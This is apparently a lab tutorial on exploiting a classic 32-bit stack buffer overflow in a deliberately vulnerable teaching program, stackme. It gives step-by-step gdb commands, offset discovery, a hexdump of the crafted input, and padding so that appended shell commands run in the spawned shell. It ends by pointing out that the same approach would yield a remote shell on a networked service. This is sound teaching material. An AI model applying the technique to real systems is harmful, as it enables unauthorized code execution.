# Stack Smashing Demo

Tested on Ubuntu 16.04 LTS

## Install toolchain for compiling for 32-bit

Since we are smashing the stack like it is 1995 anyway.

```
sudo apt-get install libc6-dev-i386
```

## Enable core dumps

First change the core file block-size limit from its default of 0

```
$ ulimit -c unlimited
```

Then change the `core_pattern` to something sensible. The following
always puts the core dump in the file 'core' but one can use e.g.
"core.%P" instead to append the process id to generate pseudo-unique
file names.

Note the following has to be run as root.

```
$ echo "core" > /proc/sys/kernel/core_pattern
```


## Crash the program, get control of EIP (program counter)

Here we use any long input. By convention we use a big string of AAAAs

````
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
````

````
$ ./stackme < input.AAAA
````

````
$ gdb ./stackme core
... gdb output follows ...
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41414141 in ?? ()
````

Note that the pc is at 0x41414141 ('AAAA') meaning that our input has eneded
up in the pc, so we have control over it.

## Using gdb to understand what is going on

To see how that happens, use gdb to set a breakpoint at the point at which
`copy_name` returns.

Use `disassemble copy_name` to find the address of the `ret` instruction:

```
(gdb) disassemble copy_name
...
0x08048581 <+50>:	ret
(gdb) b *0x08048581
```

When the breakpointis hit,  then confirm the
stack contents using the `x` instruction, at which point it looks like
this:
```
(gdb) x/4xw $esp
0xffffceec: 0x41414141	0x41414141	0x0000000a	0xf7fb45a0
```

Note `x/4xw` means print 4 words at the memory addressed by the stack
pointer. In any case, note that the stack pointer (i.e. saved return
address) is now 0x41414141.

You can examine the contents of the registers using `info registers` in
gdb.

## gef

Note that the `gef` tool gives very useful info when using gdb to examine
the execution of binaries and has a number of useful tools for exploit
development. See https://github.com/hugsy/gef

## Find the input that ends up being in the pc

The stack buffer is 32 bytes long. The return address turns out to live
at the fourth word after that on my 16.04 VM

This requires modifying some of the AAAAs to e.g. BBBB, CCCC, DDDD and
seeing which one ends up being in the PC

```
$ ./stackme < input.find_offset
```

```
$ gdb ./stackme core
...
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x45454545 in ?? ()
```

## Exploit Step 1

In this trivial case, we write the pc so that the program executes
the 'some_function' function which, conveniently, gives us a shell.

gdb can identify the address of 'some_function' wince the program is
compiled -no-pie and so each function has a fixed global address

```
$ gdb ./stackme
...
(gdb) print some_function
$1 = {void ()} 0x804852b <some_function>
```

## Put that address into the input at the right offset

For this I use the 'hexedit' program to edit the input file

Remember it has to go in reverse order because x86 is little endian
So the input to get the program to jump to some_function looks like this
(the following is a hexdump)

```
00000000   41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  AAAAAAAAAAAAAAAA
00000010   41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  AAAAAAAAAAAAAAAA
00000020   42 42 42 42  43 43 43 43  44 44 44 44  2B 85 04 08  BBBBCCCCDDDD+...
```

This input is in the file `input.jump_to_func`. When we run the program
with this input note that it doesn't crash anymore and it also doesn't
print the final "Goodbye!" message. This means that the jump to
`some_function` has worked.

```
$ ./stackme < input.jump_to_func
Welcome to level 0

Please enter your name:

Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD+�FFFF
!
```

## Exploit Step 2

Now we need to make our exploit do something. The reason that, when
the input above causes the shell to be invoked, the program does nothing
is because the shell has no input to read. We need to give it some input.
It gets its input from stdin, i.e. from the input file we are iteratively
writing. So our commands to the shell have to go into that input.

(Note: these commands are *not* what is meant by the term "shellcode".
Shellcode is binary code that causes the program to execute a shell. Our
program already has a function for doing that, so we don't need to write
any shellcode. What we are writing here are textual commands that will be
read by the shell once it runs that instructs the shell to do something
on our behalf.)

It turns out that when the first data is read from stdin, internally
the kernel tries to read 4096 bytes of input. Then after the `execve`,
when the shell is running, the shell tries to read more 
input from stdin. Therefore, to reliably get the shell to read our commands,
we need to put them in the input file after the first 4096 bytes of input.

You can confirm this by running `strace ./stackme < input.jump_to_func`
and looking through the `strace` output of all the system calls. Look
especially for calls of the form `read(0,...)` which are reads to stdin,
and `execve` which are executions of new binaries.

```
$ strace ./stackme  < input.jump_to_func  2>&1 | grep 'read(0\|execve'
execve("./stackme", ["./stackme"], [/* 67 vars */]) = 0
read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4096) = 53
execve("/bin/sh", NULL, NULL)           = 0
read(0, "", 8192)                       = 0
```

We can get our shell commands into the input therefore by padding the
input with 4096 ASCII NUL charcters (byte 0x0 -- i.e. 4096 zero bytes).
These will be ignored by the shell anyway if it reads any. Our commands
can then come after that.

Make a file `zeros` with 4096 zero bytes in it:
```
$ dd if=/dev/zero of=zeros bs=4096 count=1
```

Make a file `shell_commands` with your shell commands in it.

Then stich these together with the input that jumps to `some_function`
and put the results into the file `input.exploit`:

```
$ cat input.jump_to_func zeros shell_command > input.exploit
```

```
$ ./stackme < input.exploit
```

Your shell commands should then be executed.

Of course you could have executed them yourself. But suppose
`stackme` was running over the network and you could give it input remotely.
You would now have a working shell on the remote computer.









